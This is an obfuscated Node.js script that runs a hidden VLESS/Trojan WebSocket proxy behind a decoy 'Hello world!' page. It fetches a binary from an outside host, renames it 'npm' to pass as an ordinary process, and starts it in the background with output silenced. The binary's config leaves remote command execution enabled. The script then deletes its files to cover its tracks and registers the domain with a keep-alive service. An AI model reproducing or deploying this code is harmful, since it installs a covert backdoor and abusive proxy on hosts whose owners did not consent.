const _0x51f7d6=_0x2ce7;(function(_0x5aed1f,_0x59bc40){const _0x1b841b=_0x2ce7,_0x472513=_0x5aed1f();while(!![]){try{const _0x2a49e9=-parseInt(_0x1b841b(0x1e3))/0x1+parseInt(_0x1b841b(0x24f))/0x2*(-parseInt(_0x1b841b(0x24e))/0x3)+-parseInt(_0x1b841b(0x20e))/0x4+-parseInt(_0x1b841b(0x1e9))/0x5*(parseInt(_0x1b841b(0x223))/0x6)+-parseInt(_0x1b841b(0x254))/0x7+parseInt(_0x1b841b(0x218))/0x8*(-parseInt(_0x1b841b(0x23d))/0x9)+parseInt(_0x1b841b(0x226))/0xa*(parseInt(_0x1b841b(0x1e2))/0xb);if(_0x2a49e9===_0x59bc40)break;else _0x472513['push'](_0x472513['shift']());}catch(_0x3cdefc){_0x472513['push'](_0x472513['shift']());}}}(_0x4dcc,0x240cc));const os=require('os'),http=require(_0x51f7d6(0x25d)),fs=require('fs'),axios=require(_0x51f7d6(0x22d)),net=require('net'),path=require(_0x51f7d6(0x1ee)),crypto=require(_0x51f7d6(0x228)),{Buffer}=require(_0x51f7d6(0x262)),{exec,execSync}=require('child_process'),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x51f7d6(0x210)][_0x51f7d6(0x224)]||_0x51f7d6(0x250),NEZHA_SERVER=process[_0x51f7d6(0x210)][_0x51f7d6(0x236)]||'',NEZHA_PORT=process[_0x51f7d6(0x210)][_0x51f7d6(0x1f9)]||'',NEZHA_KEY=process[_0x51f7d6(0x210)][_0x51f7d6(0x221)]||'',DOMAIN=process[_0x51f7d6(0x210)][_0x51f7d6(0x22b)]||'1234.abc.com',AUTO_ACCESS=process['env']['AUTO_ACCESS']||!![],WSPATH=process[_0x51f7d6(0x210)][_0x51f7d6(0x25e)]||UUID['slice'](0x0,0x8),SUB_PATH=process[_0x51f7d6(0x210)][_0x51f7d6(0x23a)]||_0x51f7d6(0x1f3),NAME=process[_0x51f7d6(0x210)]['NAME']||'',PORT=process[_0x51f7d6(0x210)][_0x51f7d6(0x1e4)]||0x1eb4;let ISP='';const GetISP=async()=>{const _0x2d8dfe=_0x51f7d6;try{const _0x1e2acc=await axios[_0x2d8dfe(0x1f7)](_0x2d8dfe(0x1ed)),_0x1ae7e9=_0x1e2acc[_0x2d8dfe(0x259)];ISP=(_0x1ae7e9[_0x2d8dfe(0x202)]+'-'+_0x1ae7e9[_0x2d8dfe(0x232)])[_0x2d8dfe(0x21d)](/ /g,'_');}catch(_0x384f19){ISP=_0x2d8dfe(0x214);}};function _0x4dcc(){const _0x2b8617=['\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','reduce','log','NEZHA_SERVER','arch','decode','https://dns.google/resolve?name=','SUB_PATH','2087','Automatic\x20Access\x20Task\x20added\x20successfully','243GwOqXi','base64','update','map','&path=%2F','aarch64','write','utf-8','&type=A','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&',':443?security=tls&sni=','close','\x20with\x20all\x20DNS\x20servers','catch','arm64','3uymFZA','110352VbZDsr','8d80998a-8eb8-4c25-aeb4-35870217e010','Answer','find','url','1165787wSDHVT','https://arm64.ssss.nyc.mn/v1','npm\x20is\x20already\x20running,\x20skip\x20running...','toString','2053','data','readUInt8','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','true','http','WSPATH','vless://','unlink','application/dns-json','buffer','Server\x20is\x20running\x20on\x20port\x20','715JEhzdN','151188aZzFmL','PORT','message','https://amd64.ssss.nyc.mn/v1','pipe','Failed\x20to\x20resolve\x20','1067755eqIFqv','npm\x20download\x20successfully','end','https://amd64.ssss.nyc.mn/agent','https://api.ip.sb/geoip','path','listen','type','2083','writeHead','sub','https://arm64.ssss.nyc.mn/agent','&fp=chrome&type=ws&host=','2096','get','writeFileSync','NEZHA_PORT','text/plain','test','then','createWriteStream','/bin/bash','pop','once','application/json','country_code','slice','https://','npm\x20running\x20error:','text/html','every','substr','readUInt16BE','stream','false','npm','trojan://','571400tZnSkq','concat','env','digest','createHash','connection','Unknown','--tls','config.yaml','error','5416zWCBLU','length','sha224','8.8.4.4','connect','replace','https://oooo.serv00.net/add-url','443','post','NEZHA_KEY','Hello\x20world!','6FxBLDL','UUID','utf8','137730PsibdN','hex','crypto','join','readFile','DOMAIN','includes','axios','finish','trim','index.html','from','isp'];_0x4dcc=function(){return _0x2b8617;};return _0x4dcc();}GetISP();const httpServer=http['createServer']((_0x393139,_0x132b87)=>{const _0x2c9f74=_0x51f7d6;if(_0x393139[_0x2c9f74(0x253)]==='/'){const _0x129082=path[_0x2c9f74(0x229)](__dirname,_0x2c9f74(0x230));fs[_0x2c9f74(0x22a)](_0x129082,_0x2c9f74(0x225),(_0x26b766,_0xbe4a5f)=>{const _0x1d9d2b=_0x2c9f74;if(_0x26b766){_0x132b87[_0x1d9d2b(0x1f2)](0xc8,{'Content-Type':_0x1d9d2b(0x206)}),_0x132b87[_0x1d9d2b(0x1eb)](_0x1d9d2b(0x222));return;}_0x132b87[_0x1d9d2b(0x1f2)](0xc8,{'Content-Type':'text/html'}),_0x132b87['end'](_0xbe4a5f);});return;}else{if(_0x393139[_0x2c9f74(0x253)]==='/'+SUB_PATH){const _0x3c75f3=NAME?NAME+'-'+ISP:ISP,_0x3c5b37=_0x2c9f74(0x25f)+UUID+'@'+DOMAIN+':443?encryption=none&security=tls&sni='+DOMAIN+_0x2c9f74(0x1f5)+DOMAIN+_0x2c9f74(0x241)+WSPATH+'#'+_0x3c75f3,_0x5666aa=_0x2c9f74(0x20d)+UUID+'@'+DOMAIN+_0x2c9f74(0x249)+DOMAIN+'&fp=chrome&type=ws&host='+DOMAIN+_0x2c9f74(0x241)+WSPATH+'#'+_0x3c75f3,_0x3c4d15=_0x3c5b37+'\x0a'+_0x5666aa,_0x44acff=Buffer[_0x2c9f74(0x231)](_0x3c4d15)[_0x2c9f74(0x257)](_0x2c9f74(0x23e));_0x132b87['writeHead'](0xc8,{'Content-Type':'text/plain'}),_0x132b87[_0x2c9f74(0x1eb)](_0x44acff+'\x0a');}else _0x132b87[_0x2c9f74(0x1f2)](0x194,{'Content-Type':_0x2c9f74(0x1fa)}),_0x132b87[_0x2c9f74(0x1eb)]('Not\x20Found\x0a');}}),wss=new WebSocket['Server']({'server':httpServer}),uuid=UUID[_0x51f7d6(0x21d)](/-/g,''),DNS_SERVERS=[_0x51f7d6(0x21b),'1.1.1.1'];function resolveHost(_0x1c75ad){return new Promise((_0x1248b7,_0x4bd6ed)=>{const _0x3db2fd=_0x2ce7;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x3db2fd(0x1fb)](_0x1c75ad)){_0x1248b7(_0x1c75ad);return;}let _0x32d45b=0x0;function _0x5435c1(){const _0x20c1a7=_0x3db2fd;if(_0x32d45b>=DNS_SERVERS[_0x20c1a7(0x219)]){_0x4bd6ed(new Error(_0x20c1a7(0x1e8)+_0x1c75ad+_0x20c1a7(0x24b)));return;}const _0x152b82=DNS_SERVERS[_0x32d45b];_0x32d45b++;const _0x2235b8=_0x20c1a7(0x239)+encodeURIComponent(_0x1c75ad)+_0x20c1a7(0x245);axios[_0x20c1a7(0x1f7)](_0x2235b8,{'timeout':0x1388,'headers':{'Accept':_0x20c1a7(0x261)}})[_0x20c1a7(0x1fc)](_0x517bd7=>{const _0x880716=_0x20c1a7,_0x1bcacc=_0x517bd7['data'];if(_0x1bcacc['Status']===0x0&&_0x1bcacc[_0x880716(0x251)]&&_0x1bcacc[_0x880716(0x251)][_0x880716(0x219)]>0x0){const _0x2d0b0a=_0x1bcacc[_0x880716(0x251)][_0x880716(0x252)](_0x3ec29=>_0x3ec29[_0x880716(0x1f0)]===0x1);if(_0x2d0b0a){_0x1248b7(_0x2d0b0a[_0x880716(0x259)]);return;}}_0x5435c1();})[_0x20c1a7(0x24c)](_0x25b83b=>{_0x5435c1();});}_0x5435c1();});}function handleVlessConnection(_0x53c32e,_0x5b9966){const _0x3c3f3f=_0x51f7d6,[_0x1b93ab]=_0x5b9966,_0x487396=_0x5b9966[_0x3c3f3f(0x203)](0x1,0x11);if(!_0x487396[_0x3c3f3f(0x207)]((_0x3b28d8,_0x2c2a86)=>_0x3b28d8==parseInt(uuid['substr'](_0x2c2a86*0x2,0x2),0x10)))return![];let _0x508d24=_0x5b9966[_0x3c3f3f(0x203)](0x11,0x12)[_0x3c3f3f(0x25a)]()+0x13;const _0x171a4c=_0x5b9966['slice'](_0x508d24,_0x508d24+=0x2)['readUInt16BE'](0x0),_0xf2997f=_0x5b9966[_0x3c3f3f(0x203)](_0x508d24,_0x508d24+=0x1)[_0x3c3f3f(0x25a)](),_0xa18cfe=_0xf2997f==0x1?_0x5b9966[_0x3c3f3f(0x203)](_0x508d24,_0x508d24+=0x4)['join']('.'):_0xf2997f==0x2?new TextDecoder()[_0x3c3f3f(0x238)](_0x5b9966[_0x3c3f3f(0x203)](_0x508d24+0x1,_0x508d24+=0x1+_0x5b9966[_0x3c3f3f(0x203)](_0x508d24,_0x508d24+0x1)['readUInt8']())):_0xf2997f==0x3?_0x5b9966['slice'](_0x508d24,_0x508d24+=0x10)[_0x3c3f3f(0x234)]((_0x2bdf78,_0x53fd91,_0xdfde6b,_0xb8bb78)=>_0xdfde6b%0x2?_0x2bdf78['concat'](_0xb8bb78[_0x3c3f3f(0x203)](_0xdfde6b-0x1,_0xdfde6b+0x1)):_0x2bdf78,[])[_0x3c3f3f(0x240)](_0x248953=>_0x248953[_0x3c3f3f(0x209)](0x0)[_0x3c3f3f(0x257)](0x10))[_0x3c3f3f(0x229)](':'):'';_0x53c32e['send'](new Uint8Array([_0x1b93ab,0x0]));const _0x292691=createWebSocketStream(_0x53c32e);return resolveHost(_0xa18cfe)[_0x3c3f3f(0x1fc)](_0x5cd3dc=>{const _0x8a66cb=_0x3c3f3f;net[_0x8a66cb(0x21c)]({'host':_0x5cd3dc,'port':_0x171a4c},function(){const _0x1768b8=_0x8a66cb;this[_0x1768b8(0x243)](_0x5b9966[_0x1768b8(0x203)](_0x508d24)),_0x292691['on'](_0x1768b8(0x217),()=>{})[_0x1768b8(0x1e7)](this)['on']('error',()=>{})[_0x1768b8(0x1e7)](_0x292691);})['on'](_0x8a66cb(0x217),()=>{});})['catch'](_0x7fc349=>{const _0x3928ec=_0x3c3f3f;net[_0x3928ec(0x21c)]({'host':_0xa18cfe,'port':_0x171a4c},function(){const _0x59f560=_0x3928ec;this['write'](_0x5b9966['slice'](_0x508d24)),_0x292691['on'](_0x59f560(0x217),()=>{})[_0x59f560(0x1e7)](this)['on'](_0x59f560(0x217),()=>{})[_0x59f560(0x1e7)](_0x292691);})['on']('error',()=>{});}),!![];}function handleTrojanConnection(_0x589385,_0x33155e){const _0x514321=_0x51f7d6;try{if(_0x33155e[_0x514321(0x219)]<0x3a)return![];const _0x4a8da4=_0x33155e['slice'](0x0,0x38)[_0x514321(0x257)](),_0x37904e=[UUID];let _0x477397=null;for(const _0x4d1356 of _0x37904e){const _0x5d828a=crypto[_0x514321(0x212)](_0x514321(0x21a))[_0x514321(0x23f)](_0x4d1356)[_0x514321(0x211)](_0x514321(0x227));if(_0x5d828a===_0x4a8da4){_0x477397=_0x4d1356;break;}}if(!_0x477397)return![];let _0x2870ee=0x38;_0x33155e[_0x2870ee]===0xd&&_0x33155e[_0x2870ee+0x1]===0xa&&(_0x2870ee+=0x2);const _0x5bba43=_0x33155e[_0x2870ee];if(_0x5bba43!==0x1)return![];_0x2870ee+=0x1;const _0x4dbe36=_0x33155e[_0x2870ee];_0x2870ee+=0x1;let _0x5b5f5e,_0xeff4f;if(_0x4dbe36===0x1)_0x5b5f5e=_0x33155e['slice'](_0x2870ee,_0x2870ee+0x4)['join']('.'),_0x2870ee+=0x4;else{if(_0x4dbe36===0x3){const _0x59528e=_0x33155e[_0x2870ee];_0x2870ee+=0x1,_0x5b5f5e=_0x33155e[_0x514321(0x203)](_0x2870ee,_0x2870ee+_0x59528e)['toString'](),_0x2870ee+=_0x59528e;}else{if(_0x4dbe36===0x4)_0x5b5f5e=_0x33155e[_0x514321(0x203)](_0x2870ee,_0x2870ee+0x10)[_0x514321(0x234)]((_0x27b0ba,_0x55f4a8,_0x145e7d,_0x160243)=>_0x145e7d%0x2?_0x27b0ba[_0x514321(0x20f)](_0x160243[_0x514321(0x203)](_0x145e7d-0x1,_0x145e7d+0x1)):_0x27b0ba,[])[_0x514321(0x240)](_0x4cf512=>_0x4cf512['readUInt16BE'](0x0)[_0x514321(0x257)](0x10))[_0x514321(0x229)](':'),_0x2870ee+=0x10;else return![];}}_0xeff4f=_0x33155e['readUInt16BE'](_0x2870ee),_0x2870ee+=0x2;_0x2870ee<_0x33155e[_0x514321(0x219)]&&_0x33155e[_0x2870ee]===0xd&&_0x33155e[_0x2870ee+0x1]===0xa&&(_0x2870ee+=0x2);const _0x4b72ae=createWebSocketStream(_0x589385);return resolveHost(_0x5b5f5e)['then'](_0x49040a=>{const _0x155e26=_0x514321;net[_0x155e26(0x21c)]({'host':_0x49040a,'port':_0xeff4f},function(){const _0x32257c=_0x155e26;_0x2870ee<_0x33155e[_0x32257c(0x219)]&&this[_0x32257c(0x243)](_0x33155e[_0x32257c(0x203)](_0x2870ee)),_0x4b72ae['on'](_0x32257c(0x217),()=>{})['pipe'](this)['on'](_0x32257c(0x217),()=>{})[_0x32257c(0x1e7)](_0x4b72ae);})['on'](_0x155e26(0x217),()=>{});})[_0x514321(0x24c)](_0x2ae215=>{const _0xdcf29c=_0x514321;net['connect']({'host':_0x5b5f5e,'port':_0xeff4f},function(){const _0x4dbf4d=_0x2ce7;_0x2870ee<_0x33155e[_0x4dbf4d(0x219)]&&this[_0x4dbf4d(0x243)](_0x33155e[_0x4dbf4d(0x203)](_0x2870ee)),_0x4b72ae['on'](_0x4dbf4d(0x217),()=>{})[_0x4dbf4d(0x1e7)](this)['on']('error',()=>{})['pipe'](_0x4b72ae);})['on'](_0xdcf29c(0x217),()=>{});}),!![];}catch(_0x3439f4){return![];}}function _0x2ce7(_0x1180de,_0xd74598){_0x1180de=_0x1180de-0x1e2;const _0x4dcca6=_0x4dcc();let _0x2ce7a8=_0x4dcca6[_0x1180de];return _0x2ce7a8;}wss['on'](_0x51f7d6(0x213),(_0x4cad6e,_0x8b4520)=>{const _0x104ecd=_0x51f7d6,_0x46fb88=_0x8b4520[_0x104ecd(0x253)]||'';_0x4cad6e[_0x104ecd(0x200)](_0x104ecd(0x1e5),_0x50e6a2=>{const _0x349321=_0x104ecd;if(_0x50e6a2[_0x349321(0x219)]>0x11&&_0x50e6a2[0x0]===0x0){const _0x68367f=_0x50e6a2[_0x349321(0x203)](0x1,0x11),_0x792b55=_0x68367f['every']((_0x457d7f,_0x14e031)=>_0x457d7f==parseInt(uuid[_0x349321(0x208)](_0x14e031*0x2,0x2),0x10));if(_0x792b55){!handleVlessConnection(_0x4cad6e,_0x50e6a2)&&_0x4cad6e[_0x349321(0x24a)]();return;}}!handleTrojanConnection(_0x4cad6e,_0x50e6a2)&&_0x4cad6e[_0x349321(0x24a)]();})['on'](_0x104ecd(0x217),()=>{});});const getDownloadUrl=()=>{const _0xa213f1=_0x51f7d6,_0x431268=os[_0xa213f1(0x237)]();return _0x431268==='arm'||_0x431268===_0xa213f1(0x24d)||_0x431268===_0xa213f1(0x242)?!NEZHA_PORT?_0xa213f1(0x255):_0xa213f1(0x1f4):!NEZHA_PORT?_0xa213f1(0x1e6):_0xa213f1(0x1ec);},downloadFile=async()=>{const _0x4023da=_0x51f7d6;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x6d3166=getDownloadUrl(),_0x4cb6dd=await axios({'method':_0x4023da(0x1f7),'url':_0x6d3166,'responseType':_0x4023da(0x20a)}),_0x30cef7=fs[_0x4023da(0x1fd)](_0x4023da(0x20c));return _0x4cb6dd[_0x4023da(0x259)][_0x4023da(0x1e7)](_0x30cef7),new Promise((_0x4d2ae1,_0x124b30)=>{const _0x173bed=_0x4023da;_0x30cef7['on'](_0x173bed(0x22e),()=>{const _0x2fbd9b=_0x173bed;console[_0x2fbd9b(0x235)](_0x2fbd9b(0x1ea)),exec('chmod\x20+x\x20npm',_0x171243=>{if(_0x171243)_0x124b30(_0x171243);_0x4d2ae1();});}),_0x30cef7['on']('error',_0x124b30);});}catch(_0x1d71e3){throw _0x1d71e3;}},runnz=async()=>{const _0xd59434=_0x51f7d6;try{const _0x211e00=execSync(_0xd59434(0x246),{'encoding':_0xd59434(0x244)});if(_0x211e00[_0xd59434(0x22f)]()!==''){console[_0xd59434(0x235)](_0xd59434(0x256));return;}}catch(_0x5bdf83){}await downloadFile();let _0x5dc408='',_0x6efd12=[_0xd59434(0x21f),'8443',_0xd59434(0x1f6),_0xd59434(0x23b),_0xd59434(0x1f1),_0xd59434(0x258)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x2aac2e=_0x6efd12[_0xd59434(0x22c)](NEZHA_PORT)?_0xd59434(0x215):'';_0x5dc408='setsid\x20nohup\x20./npm\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x2aac2e+_0xd59434(0x247);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x40776f=NEZHA_SERVER['includes'](':')?NEZHA_SERVER['split'](':')[_0xd59434(0x1ff)]():'',_0x6cea27=_0x6efd12['includes'](_0x40776f)?_0xd59434(0x25c):_0xd59434(0x20b),_0x3282ae='client_secret:\x20'+NEZHA_KEY+_0xd59434(0x25b)+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0x6cea27+_0xd59434(0x233)+UUID;fs[_0xd59434(0x1f8)](_0xd59434(0x216),_0x3282ae);}_0x5dc408=_0xd59434(0x248);}else{console['log']('NEZHA\x20variable\x20is\x20empty,\x20skip\x20running');return;}}try{exec(_0x5dc408,{'shell':_0xd59434(0x1fe)},_0x2b2b52=>{const _0x509372=_0xd59434;if(_0x2b2b52)console[_0x509372(0x217)](_0x509372(0x205),_0x2b2b52);else console[_0x509372(0x235)]('npm\x20is\x20running');});}catch(_0x5c880a){console[_0xd59434(0x217)]('error:\x20'+_0x5c880a);}};async function addAccessTask(){const _0x2e79b9=_0x51f7d6;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x299d83=_0x2e79b9(0x204)+DOMAIN;try{const _0x371146=await axios[_0x2e79b9(0x220)](_0x2e79b9(0x21e),{'url':_0x299d83},{'headers':{'Content-Type':_0x2e79b9(0x201)}});console[_0x2e79b9(0x235)](_0x2e79b9(0x23c));}catch(_0xea89b6){}}const delFiles=()=>{const _0x574514=_0x51f7d6;fs[_0x574514(0x260)](_0x574514(0x20c),()=>{}),fs['unlink']('config.yaml',()=>{});};httpServer[_0x51f7d6(0x1ef)](PORT,()=>{const _0x501d33=_0x51f7d6;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x501d33(0x235)](_0x501d33(0x263)+PORT);});
